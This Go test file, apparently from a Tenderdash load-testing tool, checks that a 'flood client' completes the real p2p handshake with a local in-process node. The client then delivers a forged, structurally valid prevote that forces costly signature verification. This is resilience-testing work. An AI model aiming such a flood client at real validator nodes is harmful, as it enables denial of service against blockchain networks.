//go:build floodclient

package floodclient

import (
	"context"
	"net"
	"testing"
	"time"

	dbm "github.com/cometbft/cometbft-db"
	"github.com/stretchr/testify/require"

	"github.com/dashpay/tenderdash/internal/p2p"
	"github.com/dashpay/tenderdash/internal/p2p/conn"
	"github.com/dashpay/tenderdash/libs/log"
	tmcons "github.com/dashpay/tenderdash/proto/tendermint/consensus"
	tmproto "github.com/dashpay/tenderdash/proto/tendermint/types"
	"github.com/dashpay/tenderdash/types"
)

// TestFloodClient_HandshakeAndForgedPrevote is the milestone proof: the flood
// client completes the real p2p handshake against a live in-process node
// (production MConnTransport + Router + PeerManager admission path) and a single
// structurally-valid forged prevote it sends is received and decoded on the
// target's consensus vote channel, attributed to the attacker's node ID.
//
// This exercises the hard 80%: TCP dial, authenticated SecretConnection, the
// NodeInfo exchange, the router's compatibility check and peer admission, the
// channel framing, and the envelope decode — everything up to the reactor.
func TestFloodClient_HandshakeAndForgedPrevote(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	const network = "floodclient-milestone-chain"
	logger := log.NewNopLogger()

	// --- stand up a real target node's p2p stack ---
	targetKey := types.GenNodeKey()
	targetInfo := Identity{NodeKey: targetKey}.NodeInfo(network, "127.0.0.1:26656")

	descs := p2p.ConsensusChannelDescriptors()
	descSlice := make([]*p2p.ChannelDescriptor, 0, len(descs))
	for _, d := range descs {
		descSlice = append(descSlice, d)
	}

	transport := p2p.NewMConnTransport(logger, conn.DefaultMConnConfig(), descSlice, p2p.MConnTransportOptions{})
	listenEP := &p2p.Endpoint{Protocol: p2p.MConnProtocol, IP: net.IPv4(127, 0, 0, 1), Port: 0}

	peerManager, err := p2p.NewPeerManager(ctx, targetKey.ID, dbm.NewMemDB(), p2p.PeerManagerOptions{})
	require.NoError(t, err)

	router, err := p2p.NewRouter(
		logger,
		p2p.NopMetrics(),
		targetKey.PrivKey,
		peerManager,
		func() *types.NodeInfo { return &targetInfo },
		transport,
		listenEP,
		p2p.RouterOptions{HandshakeTimeout: 5 * time.Second},
	)
	require.NoError(t, err)
	require.NoError(t, router.Start(ctx))
	t.Cleanup(router.Wait)
	t.Cleanup(cancel)

	// Open the vote channel so inbound votes are queued rather than dropped.
	voteCh, err := router.OpenChannel(ctx, descs[p2p.ConsensusVoteChannel])
	require.NoError(t, err)

	boundEP, err := transport.Endpoint()
	require.NoError(t, err)
	require.NotZero(t, boundEP.Port)

	// --- flood client dials the target and floods one forged prevote ---
	attacker := NewIdentity()
	target := Target{
		Host:    boundEP.IP.String(),
		Port:    boundEP.Port,
		NodeID:  targetKey.ID,
		Network: network,
	}

	fc, err := Dial(ctx, logger, attacker, target, 5*time.Second)
	require.NoError(t, err, "flood client must complete the real p2p handshake")
	t.Cleanup(func() { _ = fc.Close() })
	require.Equal(t, targetKey.ID, fc.PeerInfo().NodeID)

	forged := Profiles["prevote"].Next(1, 0)
	require.NoError(t, fc.Send(ctx, forged))

	// --- the forged prevote must reach and decode at the target ---
	recvCtx, recvCancel := context.WithTimeout(ctx, 10*time.Second)
	defer recvCancel()

	iter := voteCh.Receive(recvCtx)
	require.True(t, iter.Next(recvCtx), "target did not receive the forged prevote before timeout")

	env := iter.Envelope()
	require.Equal(t, attacker.NodeKey.ID, env.From, "vote must be attributed to the attacker's node ID")

	vote, ok := env.Message.(*tmcons.Vote)
	require.True(t, ok, "expected a consensus Vote, got %T", env.Message)
	require.Equal(t, tmproto.PrevoteType, vote.Vote.Type)
	require.Len(t, vote.Vote.BlockSignature, 96, "forged BLS block signature length")
	require.Len(t, vote.Vote.ValidatorProTxHash, 32)

	// Sanity: the forged vote passes structural validation (so a real node would
	// reject it only at signature verification, which is the cost we want to
	// exercise), not at deserialization or ValidateBasic.
	domainVote, err := types.VoteFromProto(vote.Vote)
	require.NoError(t, err)
	require.NoError(t, domainVote.ValidateBasic())
}
